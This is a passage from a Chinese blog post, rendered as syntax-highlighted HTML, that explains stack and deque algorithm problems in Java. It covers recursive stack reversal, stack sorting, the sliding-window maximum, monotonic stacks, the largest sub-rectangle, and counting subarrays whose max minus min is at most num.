&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;栈为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pushToPop();</span><br><span class="line">        <span class="keyword">return</span> outStack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        pushToPop();</span><br><span class="line">        <span class="keyword">return</span> outStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">pushToPop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (outStack.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!inStack.isEmpty()) &#123;</span><br><span class="line">                outStack.push(inStack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何仅用递归函数和栈操作逆序一个栈"><a href="#如何仅用递归函数和栈操作逆序一个栈" class="headerlink" title="如何仅用递归函数和栈操作逆序一个栈"></a>如何仅用递归函数和栈操作逆序一个栈</h2><blockquote><p>通过递归函数实现栈中元素的逆序，比如放入：1,2,3,4. 逆序后：4,3,2,1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归逆序栈  其实底层利用了栈帧的局部变量表去存储临时变量</span></span><br><span class="line"><span class="comment">// 1. 每次pop()，返回栈底元素</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAndRemoveLastElement</span><span class="params">(Stack&lt;Integer&gt; stack)</span> &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">    <span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> pop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastElement</span> <span class="operator">=</span> getAndRemoveLastElement(stack);</span><br><span class="line">    stack.push(pop);</span><br><span class="line">    <span class="keyword">return</span> lastElement;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 逆序栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(Stack&lt;Integer&gt; stack)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果为空，说明已经到底了，栈内没元素了</span></span><br><span class="line">    <span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 我们可以理解为，每次我就去取栈底的值，</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">element</span> <span class="operator">=</span> getAndRemoveLastElement(stack);</span><br><span class="line">    <span class="comment">// 剩下的每一次递归都会去取栈底元素，直到为空</span></span><br><span class="line">    reverse(stack);</span><br><span class="line">    <span class="comment">// 将栈底元素放到栈顶</span></span><br><span class="line">    stack.push(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用一个栈实现另一个栈的排序"><a href="#用一个栈实现另一个栈的排序" class="headerlink" title="用一个栈实现另一个栈的排序"></a>用一个栈实现另一个栈的排序</h2><p>方法1（利用栈帧）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Stack&lt;Integer&gt; helpStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (helpStack.isEmpty() || helpStack.peek() &gt;= value) &#123;</span><br><span class="line">        helpStack.push(value);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">pop</span> <span class="operator">=</span> helpStack.pop();</span><br><span class="line">    reverse(value);</span><br><span class="line">    helpStack.push(pop);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseByStack</span><span class="params">(Stack&lt;Integer&gt; stack)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将stack内所有元素有序放入helpStack，所有元素访问后，helpStack有序，则导入stack，保证stack有序</span></span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        reverse(stack.pop());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!helpStack.isEmpty()) &#123;</span><br><span class="line">        stack.push(helpStack.pop());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法2（利用栈本身，更省空间）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过一个栈来帮另一个栈做排序， 将多余的值直接放入stack，性能更好，也更节省空间</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseByStackPlus</span><span class="params">(Stack&lt;Integer&gt; stack)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;Integer&gt; helpStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">cur</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        <span class="keyword">while</span> (!helpStack.isEmpty() &amp;&amp; helpStack.peek() &lt; cur) &#123;</span><br><span class="line">            stack.push(helpStack.pop());</span><br><span class="line">        &#125;</span><br><span class="line">        helpStack.push(cur);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!helpStack.isEmpty()) &#123;</span><br><span class="line">        stack.push(helpStack.pop());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生成窗口最大值数组-双端队列"><a href="#生成窗口最大值数组-双端队列" class="headerlink" title="生成窗口最大值数组(双端队列)"></a>生成窗口最大值数组(双端队列)</h2><p>输入：整形数组arr，窗口大小w。</p><p>输出：一个长度为n-w+1的数组res，res[i]表示每一种窗口状态下最大值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生窗口最大值数组，本题的关键在于利用双端队列，来记录滑动窗口的最大值</span></span><br><span class="line"><span class="comment"> * 为啥用双端队列？ 因为我们需要动态的从队列的头和尾更新值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 输入数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> w   窗口大小</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] getMaxWindow(<span class="type">int</span>[] arr, <span class="type">int</span> w) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr == <span class="literal">null</span> || arr.length &lt; w || w&lt;<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// arr.length - w + 1 表示窗口大小w时，最终能获取到多少个最大值</span></span><br><span class="line">    <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length - w + <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 双端队列，记录窗口内最大值，并进行数据的更新，</span></span><br><span class="line">    LinkedList&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 插入策略</span></span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty() &amp;&amp; arr[queue.peekLast()] &lt;= arr[i]) &#123;</span><br><span class="line">            <span class="comment">// 队列中记录的是最大值的下标，方便更新时，判断是否过期</span></span><br><span class="line">            queue.pollLast();</span><br><span class="line">        &#125;</span><br><span class="line">        queue.addLast(i);</span><br><span class="line">        <span class="comment">// 弹出策略 i-w 表示过期值，比如i=5，w=3,i-w=2, 当前遍历到i=5的点，窗口长度为3，那当前窗口内有效值应该是&#123;3,4,5&#125;，2已经过期了</span></span><br><span class="line">        <span class="keyword">if</span> (queue.peekFirst() == i-w) &#123;</span><br><span class="line">            queue.pollFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= w -<span class="number">1</span>) &#123;</span><br><span class="line">            res[index++] = arr[queue.peekFirst()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="单调栈结构"><a href="#单调栈结构" class="headerlink" title="单调栈结构"></a>单调栈结构</h2><blockquote><p>给定一个不含有重复值的数组arr，找到每个i位置左边和右边离i位置最近且值比arr[i]小的位置，返回所有位置的相应信息</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 单调栈结构-找到每个节点离自己最近且比自己小的节点位置</span></span><br><span class="line"><span class="comment"> * 这里默认arr内无重复值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[][] rightWay(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">    <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length][<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 栈内存储节点位置</span></span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 策略：遍历数组，并将值放入栈中，</span></span><br><span class="line">    <span class="comment">// 如果比栈顶值大，则直接放入，下面的值就是离自己最近的最小值点</span></span><br><span class="line">    <span class="comment">// 如果比栈顶值小，则将栈中比自己大的都弹出，确认对应的坐标</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; arr[stack.peek()] &gt; arr[i]) &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">popIndex</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            res[popIndex][<span class="number">0</span>] = stack.isEmpty()?-<span class="number">1</span>:stack.peek();</span><br><span class="line">            res[popIndex][<span class="number">1</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后如果栈中还有数据，则一定是升序，也就是说栈内的每个节点都是左边有比自己小的，右边没有。</span></span><br><span class="line">    <span class="comment">// 这里需要注意栈底的点，这个点是左边也没有，右边也没有</span></span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">popIndex</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        res[popIndex][<span class="number">0</span>] = stack.isEmpty()?-<span class="number">1</span>:stack.peek();</span><br><span class="line">        res[popIndex][<span class="number">1</span>] = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 单调栈结构-找到每个节点离自己最近且比自己小的节点位置</span></span><br><span class="line"><span class="comment"> * 这里默认数组内有重复值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[][] rightWay(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">    <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length][<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 栈内存储节点位置，节点用List，来存储多个相同的值，List内部存储的也是坐标</span></span><br><span class="line">    Stack&lt;List&lt;Integer&gt;&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 策略：遍历数组，并将值放入栈中</span></span><br><span class="line">    <span class="comment">// 如果比栈顶值大，则直接放入，下面的值就是离自己最近的最小值点</span></span><br><span class="line">    <span class="comment">// 如果和栈顶值一样，则加入栈顶的元素集合中</span></span><br><span class="line">    <span class="comment">// 如果比栈顶值小，则将栈中比自己大的都弹出，确认对应的坐标</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; arr[stack.peek().get(<span class="number">0</span>)] &gt; arr[i]) &#123;</span><br><span class="line">            List&lt;Integer&gt; popList = stack.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">leftIndex</span> <span class="operator">=</span> stack.isEmpty() ? -<span class="number">1</span> : stack.peek().get(stack.peek().size() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (Integer popi : popList) &#123;</span><br><span class="line">                res[popi][<span class="number">0</span>] = leftIndex;</span><br><span class="line">                res[popi][<span class="number">1</span>] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!stack.isEmpty() &amp;&amp; arr[stack.peek().get(<span class="number">0</span>)] == arr[i]) &#123;</span><br><span class="line">            stack.peek().add(i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            list.add(i);</span><br><span class="line">            stack.push(list);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        List&lt;Integer&gt; popList = stack.pop();</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftIndex</span> <span class="operator">=</span> stack.isEmpty() ? -<span class="number">1</span> : stack.peek().get(stack.peek().size() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (Integer popi : popList) &#123;</span><br><span class="line">            res[popi][<span class="number">0</span>] = leftIndex;</span><br><span class="line">            res[popi][<span class="number">1</span>] = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="求最大子矩阵的大小（单调栈应用）"><a href="#求最大子矩阵的大小（单调栈应用）" class="headerlink" title="求最大子矩阵的大小（单调栈应用）"></a>求最大子矩阵的大小（单调栈应用）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 求最大子矩阵的大小 -》 单调栈</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">maxRecSize</span><span class="params">(<span class="type">int</span>[][] arr)</span> &#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 记录切分后每个位置的高度</span></span><br><span class="line">    <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[arr[<span class="number">0</span>].length];</span><br><span class="line">    <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 步骤1：将二维数组切割为一维数组，record[i] 表示i位置上有多高</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span>[] curList : arr) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; curList.length; i++) &#123;</span><br><span class="line">            record[i] += curList[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 步骤2：利用单调栈找出每个点左右两侧，离自己最近且比自己小的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; record.length; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; record[i] &lt; record[stack.peek()]) &#123;</span><br><span class="line">            <span class="comment">// 如果当前值小于栈顶元素，说明栈顶元素列的最大面积已经能计算出来了</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">popIndex</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">popLeftIndex</span> <span class="operator">=</span> stack.isEmpty() ? -<span class="number">1</span> : stack.peek();</span><br><span class="line">            <span class="comment">// 面积值:(i-popLeftIndex-1)*record[popIndex]</span></span><br><span class="line">            max = Math.max(max, (i - popLeftIndex - <span class="number">1</span>) * record[popIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 栈内可能还有剩余元素</span></span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">popIndex</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        <span class="type">int</span> <span class="variable">popLeftIndex</span> <span class="operator">=</span> stack.isEmpty() ? -<span class="number">1</span> : stack.peek();</span><br><span class="line">        <span class="comment">// 面积值: 左边肯定比自己小，但右边都是比自己大的</span></span><br><span class="line">        max = Math.max(max,(record.length-popLeftIndex-<span class="number">1</span>)*record[popIndex]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最大值减去最小值小于或等于num的子数组的数量（Max-Min-lt-Num-）（双端队列应用）"><a href="#最大值减去最小值小于或等于num的子数组的数量（Max-Min-lt-Num-）（双端队列应用）" class="headerlink" title="最大值减去最小值小于或等于num的子数组的数量（Max - Min &lt;= Num ）（双端队列应用）"></a>最大值减去最小值小于或等于num的子数组的数量（Max - Min &lt;= Num ）（双端队列应用）</h2><blockquote><p>如果数组长度为N，请实现O(N)的算法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 最大值减去最小值小于或等于num的子数组的数量</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   * 思路：子数组是多个，当在不断变化时，最大值与最小值也在不断的更新，所以我们应该用一种结构可以实时记录和更新数组中最大值和最小值</span></span><br><span class="line"><span class="comment">   * 这里我们可以想到上面的滑动窗口问题，当时是记录窗口内的最大值。所以这里我们使用两个滑动窗口，一个记录最大值，一个记录最小值</span></span><br><span class="line"><span class="comment">   * max(arr[i..j]) - min(arr[i...j]) &lt;= num ，如果从i-j每种子集都计算一遍，时间复杂度太高，我们可以找找特定的规律</span></span><br><span class="line"><span class="comment">   * - 如果max(arr[i..j]) - min(arr[i...j]) &lt;= num 成立，则arr[i...j]中每一个数组都满足条件,即arr[k...l] (i&lt;=k&lt;=l&lt;=j)</span></span><br><span class="line"><span class="comment">   * 我们用arr[i...j-1]举例， max[arr[i...j]] &gt;= max[arr[i...j-1]]， 因为j如果j比i-(j-1)都大，则=成立，如果不是，则&gt; 成立</span></span><br><span class="line"><span class="comment">   * - 如果上面情况不成立，则arr[k...l](k&lt;=i&lt;=j&lt;=l) 都不满足条件，这样我们就可以排除许多的可能</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">      <span class="comment">// 记录最大值</span></span><br><span class="line">      LinkedList&lt;Integer&gt; maxList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">      <span class="comment">// 记录最小值</span></span><br><span class="line">      LinkedList&lt;Integer&gt; minList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>, result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; arr.length) &#123;</span><br><span class="line">          <span class="keyword">while</span> (j &lt; arr.length) &#123;</span><br><span class="line">              <span class="comment">// 这里if(false)的唯一可能就是，j在某点时，已经不能继续向前了，所以i开始向右偏移，看是否可以让条件重新满足</span></span><br><span class="line">              <span class="keyword">if</span> (minList.isEmpty() || minList.peekLast() != j) &#123;</span><br><span class="line">                  <span class="comment">// 更新最小值</span></span><br><span class="line">                  <span class="keyword">while</span> (!minList.isEmpty() &amp;&amp; arr[minList.peekLast()] &gt;= arr[j]) &#123;</span><br><span class="line">                      minList.pollLast();</span><br><span class="line">                  &#125;</span><br><span class="line">                  minList.addLast(j);</span><br><span class="line">                  <span class="comment">// 更新最大值</span></span><br><span class="line">                  <span class="keyword">while</span> (!maxList.isEmpty() &amp;&amp; arr[maxList.peekLast()] &lt;= arr[j]) &#123;</span><br><span class="line">                      maxList.pollLast();</span><br><span class="line">                  &#125;</span><br><span class="line">                  maxList.addLast(j);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// 判断当前结果是否满足条件</span></span><br><span class="line">              <span class="keyword">if</span> ((arr[maxList.peekFirst()] - arr[minList.peekFirst()]) &gt; num) &#123;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              j++;</span><br><span class="line">          &#125;</span><br><span class="line">          result += j - i;</span><br><span class="line">          <span class="comment">// 检查最大值和最小值是否过期，需要更新的</span></span><br><span class="line">          <span class="keyword">if</span> (maxList.peekFirst() == i) &#123;</span><br><span class="line">              maxList.pollFirst();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (minList.peekFirst() == i) &#123;</span><br><span class="line">              minList.pollFirst();</span><br><span class="line">          &#125;</span><br><span class="line">          i++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
